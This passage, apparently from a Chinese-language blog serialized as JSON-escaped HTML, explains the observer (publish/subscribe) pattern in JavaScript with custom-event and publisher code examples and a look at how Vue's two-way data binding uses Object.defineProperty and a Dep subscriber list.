class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//paper注册joe（即joe向paper订阅）</span></span><br><span class=\"line\">paper.subscribe(joe.drinkCoffee);</span><br><span class=\"line\">paper.subscribe(joe.sundayPreNap, <span class=\"string\">'monthly'</span>);</span><br><span class=\"line\"><span class=\"comment\">//即joe为默认“any”事件提供了一个可被调用的方法，而另一个可被调用的方法则用于当“monthly”类型的事件发生时的情况。现在让我们来触发一些事件：</span></span><br><span class=\"line\">paper.daily();      <span class=\"comment\">//Just read big news today</span></span><br><span class=\"line\">paper.daily();      <span class=\"comment\">//Just read big news today</span></span><br><span class=\"line\">paper.monthly();    <span class=\"comment\">//About to fall asleep reading this interesting analysis</span></span><br><span class=\"line\">paper.monthly();    <span class=\"comment\">//About to fall asleep reading this interesting analysis</span></span><br><span class=\"line\">paper.monthly();    <span class=\"comment\">//About to fall asleep reading this interesting analysis</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Vue中的使用\"><a href=\"#Vue中的使用\" class=\"headerlink\" title=\"Vue中的使用\"></a>Vue中的使用</h2><h3 id=\"关于数据双向绑定的理解\"><a href=\"#关于数据双向绑定的理解\" class=\"headerlink\" title=\"关于数据双向绑定的理解\"></a>关于数据双向绑定的理解</h3><ul>\n<li>view ==&gt; data，通过绑定事件实现；</li>\n<li>data ==&gt; view，通过获取dom元素赋值实现；</li>\n<li>data &lt;=&gt; view，以上两者结合；<br>关于vue对该模块的实现，请看以下两张图：<br>实现过程：<br><img src=\"/2019-02-01-观察者模式/2.png\" alt=\"图一\"><br>观察者模式实现：<br><img src=\"/2019-02-01-观察者模式/1.png\" alt=\"图二\"><br>实现的示例代码：<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"built_in\">Object</span>.defineProperty(data, key, &#123;</span><br><span class=\"line\">      enumerable: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      configurable: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      get: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Dep.target) &#123;</span><br><span class=\"line\">          <span class=\"comment\">// 添加一个订阅者watcher</span></span><br><span class=\"line\">          dep.addSub(Dep.target);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      <span class=\"comment\">// setter，如果对一个对象属性值改变，就会触发setter中的dep.notify(),通知watcher（订阅者）数据变更，执行对应订阅者的更新函数，来更新视图。</span></span><br><span class=\"line\">      set: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">newVal</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (value === newVal) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        value = newVal;</span><br><span class=\"line\">        <span class=\"comment\">// 新的值是object的话，进行监听</span></span><br><span class=\"line\">        childObj = observe(value);</span><br><span class=\"line\">        <span class=\"comment\">// 发布</span></span><br><span class=\"line\">        dep.notify();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Dep</span>(<span class=\"params\"></span>) </span>&#123; <span class=\"comment\">// 消息订阅器Dep，订阅器Dep主要负责收集订阅者，然后再属性变化的时候执行对应订阅者的更新函数</span></span><br><span class=\"line\">  <span class=\"keyword\">this</span>.subs = [];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Dep.prototype = &#123;</span><br><span class=\"line\">  <span class=\"comment\">//添加订阅者</span></span><br><span class=\"line\">  addSub: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sub</span>) </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">this</span>.subs.push(sub);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 发布通知</span></span><br><span class=\"line\">  notify: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.subs.forEach(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sub</span>) </span>&#123;</span><br><span class=\"line\">      sub.update();</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>结合注释及流程图，对于该模式在其中的应用就很好理解了：订阅器为Dep类，实现两个实例方法添加订阅者（addSub）和发布通知（notify），其中订阅者为Watcher实例，主要方法为update，该方法实现了data数据更新及调用更新view的方法。至于何时添加订阅者（addSub）和发布通知（notify），这个就看具体使用主体的需要了。</p>\n<p>vue中的实现，核心就是通过数据劫持（Object.defineProperty），该方法实现了对象属性读取时会调用get方法，赋值时会调用set方法。这样，在get中调用addSub，set中调用notify，也就实现了数据更新时发布通知，告诉订阅器watcher去完成相关更新工作update，这就完成了从data =&gt; view的自动更新。至于从view =&gt; data，熟悉的dom事件绑定，就如我们开头说的，事件绑定也是观察者模式。</p>\n<p>参考：<br>图一相关：<a href=\"http://www.cnblogs.com/libin-1/p/6893712.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/libin-1/p/6893712.html</a><br>图二相关：<a href=\"https://blog.csdn.net/github_36369819/article/details/79201314\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/github_36369819/article/details/79201314</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>观察者(observer) 模式，也叫自定义事件(custom events)，也叫订阅/发布(subscriber/publisher)模式。其实日常很多地方都在用，只是没有意识到或者没有提炼出’观察者模式‘这个概念。例如，下面实践回顾中说的场景，jQuery中的自定义事件，Vue中的双向绑定，nodejs中的eventEmitter等。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实践回顾\"><a href=\"#实践回顾\" class=\"headerlink\" title=\"实践回顾\"></a>实践回顾</h2><p>总结这个的起因是，最初在做一个图片编辑的 UI 组件（pipeImg），一个使用场景是：<code>new PipeImg().show();</code>。问题在于，由于待编辑图片加载是异步的，需要图片 load 完成再调用 show 方法才有效。也就是先报名（订阅），然后等通知（发布）。这不正是我们说的订阅/发布模式（观察者模式）吗？</p>\n<p>示例代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">  methods: [],</span><br><span class=\"line\"></span><br><span class=\"line\">  show: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">params</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.methods.push(&#123;</span><br><span class=\"line\">      name: <span class=\"string\">\"show\"</span>,</span><br><span class=\"line\">      params: params</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  exec: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.methods.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> element = <span class=\"keyword\">this</span>.methods[i];</span><br><span class=\"line\">      <span class=\"keyword\">this</span>[<span class=\"string\">\"_\"</span> + element.name](element.params);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.methods = [];</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  _show: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 真正的实现代码</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  init: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> image = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\">    image.src = <span class=\"string\">'xxxx'</span>;</span><br><span class=\"line\">    image.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.exec();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>看了实际的案例，接下来我们系统学习下这个模式，了解其中的设计思想，总结一个通用方法。</p>\n<h2 id=\"如此简单\"><a href=\"#如此简单\" class=\"headerlink\" title=\"如此简单\"></a>如此简单</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  alert(<span class=\"string\">'hello'</span>);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>这个就是？基本思想就是这样：先注册事件，然后等到具体事件触发时执行回调函数。下面我们再给出一例：</p>\n<h2 id=\"自定义事件\"><a href=\"#自定义事件\" class=\"headerlink\" title=\"自定义事件\"></a>自定义事件</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Event = &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 处理函数储存器</span></span><br><span class=\"line\">  handlers: &#123;&#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 绑定</span></span><br><span class=\"line\">  on: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">type, fn</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.handlers[type]) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.handlers[type] = [];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.handlers[type].push(fn);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 触发</span></span><br><span class=\"line\">  trigger: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">type</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.handlers[type].length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.handlers[type][i]();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 解除</span></span><br><span class=\"line\">  off: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">type, fn</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.handlers[type].length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.handlers[type][i] === fn) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 移除给定的fn</span></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.handlers[type].splice(i, <span class=\"number\">1</span>);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 移除所有type类型的</span></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.handlers[type].length = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试</span></span><br><span class=\"line\">Event.on(<span class=\"string\">\"test\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"test first\"</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">Event.on(<span class=\"string\">\"test\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"test second\"</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">Event.trigger(<span class=\"string\">\"test\"</span>);</span><br><span class=\"line\">Event.off(<span class=\"string\">'test'</span>);</span><br><span class=\"line\">Event.trigger(<span class=\"string\">\"test\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// test first</span></span><br><span class=\"line\"><span class=\"comment\">// test second</span></span><br></pre></td></tr></table></figure>\n<p>似曾相识？没错，就是类似jQuery的自定义事件。下面再抽象一个通用的：</p>\n<h2 id=\"发布-订阅\"><a href=\"#发布-订阅\" class=\"headerlink\" title=\"发布/订阅\"></a>发布/订阅</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 摘自《JavaScript模式》</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> publisher = &#123;</span><br><span class=\"line\">  subscribers: &#123;</span><br><span class=\"line\">    any: [] <span class=\"comment\">//event type: subscribers</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  subscribe: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">fn, type</span>) </span>&#123;</span><br><span class=\"line\">    type = type || <span class=\"string\">\"any\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> <span class=\"keyword\">this</span>.subscribers[type] === <span class=\"string\">\"undefined\"</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.subscribers[type] = [];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.subscribers[type].push(fn);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  unsubscribe: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">fn, type</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.visitSubscribers(<span class=\"string\">'unsubscribe'</span>, fn, type);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  publish: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">publication, type</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.visitSubscribers(<span class=\"string\">'publish'</span>, publication, type);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  visitSubscribers: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">action, arg, type</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> pubtype = type || <span class=\"string\">'any'</span>,</span><br><span class=\"line\">        subscribers = <span class=\"keyword\">this</span>.subscribers[pubtype];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>; i&lt; subscribers.length; i++)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(action === <span class=\"string\">'publish'</span>)&#123;</span><br><span class=\"line\">        subscribers[i](arg);</span><br><span class=\"line\">      &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(subscribers[i] === arg)&#123;</span><br><span class=\"line\">            subscribers.splice(i,<span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//定义一个函数makePublisher()，它接受一个对象作为对象，通过把上述通用发布者的方法复制到该对象中，从而将其转换为一个发布者</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">makePublisher</span>(<span class=\"params\">obj</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i <span class=\"keyword\">in</span> publisher) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (publisher.hasOwnProperty(i) &amp;&amp; <span class=\"keyword\">typeof</span> publisher[i] === <span class=\"string\">\"function\"</span>) &#123;</span><br><span class=\"line\">      obj[i] = publisher[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  obj.subscribers = &#123;<span class=\"attr\">any</span>: []&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//实现一个发布者paper对象</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> paper = &#123;</span><br><span class=\"line\">    daily: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.publish(<span class=\"string\">\"big news today\"</span>);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    monthly: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.publish(<span class=\"string\">\"interesting analysis\"</span>,<span class=\"string\">\"monthly\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//将paper构造成一个发布者</span></span><br><span class=\"line\">makePublisher(paper);</span><br><span class=\"line\"><span class=\"comment\">//实现一个订阅这joe对象</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> joe = &#123;</span><br><span class=\"line\">  drinkCoffee: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">publication</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'Just read '</span> + publication);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  sundayPreNap: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">publication</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'About to fall asleep reading this '</span> + publication);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//paper注册joe（即joe向paper订阅）</span></span><br><span class=\"line\">paper.subscribe(joe.drinkCoffee);</span><br><span class=\"line\">paper.subscribe(joe.sundayPreNap, <span class=\"string\">'monthly'</span>);</span><br><span class=\"line\"><span class=\"comment\">//即joe为默认“any”事件提供了一个可被调用的方法，而另一个可被调用的方法则用于当“monthly”类型的事件发生时的情况。现在让我们来触发一些事件：</span></span><br><span class=\"line\">paper.daily();      <span class=\"comment\">//Just read big news today</span></span><br><span class=\"line\">paper.daily();      <span class=\"comment\">//Just read big news today</span></span><br><span class=\"line\">paper.monthly();    <span class=\"comment\">//About to fall asleep reading this interesting analysis</span></span><br><span class=\"line\">paper.monthly();    <span class=\"comment\">//About to fall asleep reading this interesting analysis</span></span><br><span class=\"line\">paper.monthly();    <span class=\"comment\">//About to fall asleep reading this interesting analysis</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Vue中的使用\"><a href=\"#Vue中的使用\" class=\"headerlink\" title=\"Vue中的使用\"></a>Vue中的使用</h2><h3 id=\"关于数据双向绑定的理解\"><a href=\"#关于数据双向绑定的理解\" class=\"headerlink\" title=\"关于数据双向绑定的理解\"></a>关于数据双向绑定的理解</h3><ul>\n<li>view ==&gt; data，通过绑定事件实现；</li>\n<li>data ==&gt; view，通过获取dom元素赋值实现；</li>\n<li>data &lt;=&gt; view，以上两者结合；<br>关于vue对该模块的实现，请看以下两张图：<br>实现过程：<br><img src=\"/2019-02-01-观察者模式/2.png\" alt=\"图一\"><br>观察者模式实现：<br><img src=\"/2019-02-01-观察者模式/1.png\" alt=\"图二\"><br>实现的示例代码：<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"built_in\">Object</span>.defineProperty(data, key, &#123;</span><br><span class=\"line\">      enumerable: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      configurable: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      get: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Dep.target) &#123;</span><br><span class=\"line\">          <span class=\"comment\">// 添加一个订阅者watcher</span></span><br><span class=\"line\">          dep.addSub(Dep.target);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      <span class=\"comment\">// setter，如果对一个对象属性值改变，就会触发setter中的dep.notify(),通知watcher（订阅者）数据变更，执行对应订阅者的更新函数，来更新视图。</span></span><br><span class=\"line\">      set: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">newVal</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (value === newVal) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        value = newVal;</span><br><span class=\"line\">        <span class=\"comment\">// 新的值是object的话，进行监听</span></span><br><span class=\"line\">        childObj = observe(value);</span><br><span class=\"line\">        <span class=\"comment\">// 发布</span></span><br><span class=\"line\">        dep.notify();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Dep</span>(<span class=\"params\"></span>) </span>&#123; <span class=\"comment\">// 消息订阅器Dep，订阅器Dep主要负责收集订阅者，然后再属性变化的时候执行对应订阅者的更新函数</span></span><br><span class=\"line\">  <span class=\"keyword\">this</span>.subs = [];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Dep.prototype = &#123;</span><br><span class=\"line\">  <span class=\"comment\">//添加订阅者</span></span><br><span class=\"line\">  addSub: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sub</span>) </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">this</span>.subs.push(sub);</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 发布通知</span></span><br><span class=\"line\">  notify: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.subs.forEach(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">sub</span>) </span>&#123;</span><br><span class=\"line\">      sub.update();</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>结合注释及流程图，对于该模式在其中的应用就很好理解了：订阅器为Dep类，实现两个实例方法添加订阅者（addSub）和发布通知（notify），其中订阅者为Watcher实例，主要方法为update，该方法实现了data数据更新及调用更新view的方法。至于何时添加订阅者（addSub）和发布通知（notify），这个就看具体使用主体的需要了。</p>\n<p>vue中的实现，核心就是通过数据劫持（Object.defineProperty），该方法实现了对象属性读取时会调用get方法，赋值时会调用set方法。这样，在get中调用addSub，set中调用notify，也就实现了数据更新时发布通知，告诉订阅器watcher去完成相关更新工作update，这就完成了从data =&gt; 